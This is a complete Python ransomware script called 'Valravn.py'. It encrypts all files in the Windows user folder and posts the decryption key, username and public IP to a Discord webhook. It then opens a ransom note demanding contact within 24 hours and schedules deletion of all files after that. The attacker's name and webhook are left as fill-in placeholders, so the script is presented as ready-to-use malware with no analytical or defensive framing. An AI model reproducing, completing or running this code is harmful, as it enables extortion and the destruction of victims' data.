import os
import subprocess
from cryptography.fernet import Fernet
import re
import json
import requests
import time
import threading
from pathlib import Path

key = Fernet.generate_key()
user = str(os.environ["USERNAME"])

def timer():
    path1 = "C:\\\\Users\\\\" + user
    my_path = Path(path1)
    print("timer started")
    time.sleep(86400)
    for file in my_path.glob("**/*.*"):
        os.system("del " + file + " /s /f /q")

def crypt(filename):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def warn():
    name = "yourname" #change to your discord name and tag
    ip = requests.get('https://api.ipify.org').text
    url = "webhook" # webhook url 
    data = {}
    data["content"] = "Key Content for " + user + ": " + str(key) 
    data["username"] = ip
    requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
    f = open("Valravn.txt", "w")
    f.write("Ooops you have been infected with Valravn.py! your files are encrypted! Contact " + name + " on discord to get your files back! You have 24 hours to contact me, after that all your files will be deleted")
    f.close()
    subprocess.call(r"notepad Valravn.txt", shell=False)


def main():
    path1 = "C:\\\\Users\\\\" + user
    my_path = Path(path1)
    for file in my_path.glob("**/*.*"):
        crypt(file)
    warnthread = threading.Thread(target=warn)
    timerthread = threading.Thread(target=timer)
    warnthread.start()
    timerthread.start()

main()
